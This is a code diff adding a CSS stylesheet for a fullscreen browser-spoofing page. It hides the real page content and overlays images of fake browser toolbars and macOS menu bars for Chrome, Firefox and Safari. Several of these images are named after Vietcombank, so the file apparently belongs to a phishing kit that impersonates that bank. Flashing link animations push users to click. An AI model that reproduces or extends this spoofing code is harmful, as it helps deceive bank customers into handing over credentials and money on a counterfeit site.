@@ -1,0 +1,171 @@
+html {
+    height: auto;
+    width: fit-content;
+}
+
+html.fullscreened {
+    overflow: hidden;
+    background-color: #fff;
+}
+
+.fullscreened #container {
+    display: none;
+}
+
+#spoofSite {
+    background-color: #fff;
+    left: 0;
+    margin: 0 auto;
+    overflow-y: scroll;
+    position: fixed;
+    width: 102%;
+    z-index: 2;
+    /* Updated in JS */
+    top: 85px;
+    height: 800px;
+}
+
+.not-fullscreened #spoofSite {
+    display: none;
+}
+
+#spoofHeader {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    z-index: 2;
+}
+
+.not-fullscreened #spoofHeader {
+    display: none;
+}
+
+#spoofMenu,
+#spoofBrowser {
+    width: 100%;
+}
+
+
+/* Menu (OS X only) */
+
+.osx #spoofMenu {
+    height: 22px;
+}
+
+.windows #spoofMenu,
+.linux #spoofMenu {
+    height: 0;
+}
+
+.chrome.osx #spoofMenu {
+    background: url(../img/header_vietcombank_chrome.png) center top no-repeat;
+    height: 100px;
+}
+
+.firefox.osx #spoofMenu {
+    background: url(../img/header_vietcombank_firefox.png) center top no-repeat;
+}
+
+.safari.osx #spoofMenu {
+    background: url(../img/menu-osx-safari-left.png) left top no-repeat, url(../img/menu-osx-right.png) right top no-repeat, url(../img/menu-osx-bg.png) left top repeat-x;
+}
+
+
+/* Browser UI */
+
+.chrome.osx #spoofBrowser {
+    background: url(../img/header_vietcombank_chrome.png) center top no-repeat;
+    height: 100px;
+}
+
+.chrome.windows #spoofBrowser {
+    position: relative;
+    background: url(../img/header_vietcombank_chrome.png) center top no-repeat;
+    height: 100px;
+}
+
+.chrome.linux #spoofBrowser {
+    background: url(../img/header_vietcombank_chrome.png) center top no-repeat;
+    height: 100px;
+}
+
+.firefox.osx #spoofBrowser {
+    background: url(../img/browser-osx-firefox-center.png) center top no-repeat;
+    height: 130px;
+}
+
+.firefox.windows #spoofBrowser {
+    background: url(../img/header_vietcombank_firefox.png) center top no-repeat;
+    height: 130px;
+}
+
+.firefox.linux #spoofBrowser {
+    background: url(../img/browser-osx-firefox-center.png) center top no-repeat;
+    height: 130px;
+}
+
+.safari.osx #spoofBrowser {
+    background: url(../img/browser-osx-firefox-center.png) center top no-repeat;
+    height: 130px;
+}
+
+.safari.windows #spoofBrowser {
+    background: url(../img/browser-osx-firefox-center.png) center top no-repeat;
+    height: 130px;
+}
+
+@-webkit-keyframes my {
+    0% {
+        color: #510af8;
+    }
+    50% {
+        color: #fff;
+    }
+    100% {
+        color: #510af8;
+    }
+}
+
+@-moz-keyframes my {
+    0% {
+        color: #510af8;
+    }
+    50% {
+        color: #fff;
+    }
+    100% {
+        color: #510af8;
+    }
+}
+
+@-o-keyframes my {
+    0% {
+        color: #510af8;
+    }
+    50% {
+        color: #fff;
+    }
+    100% {
+        color: #510af8;
+    }
+}
+
+@keyframes my {
+    0% {
+        color: #510af8;
+    }
+    50% {
+        color: #fff;
+    }
+    100% {
+        color: #510af8;
+    }
+}
+
+.click a {
+    -webkit-animation: my 700ms infinite;
+    -moz-animation: my 700ms infinite;
+    -o-animation: my 700ms infinite;
+    animation: my 700ms infinite;
+}
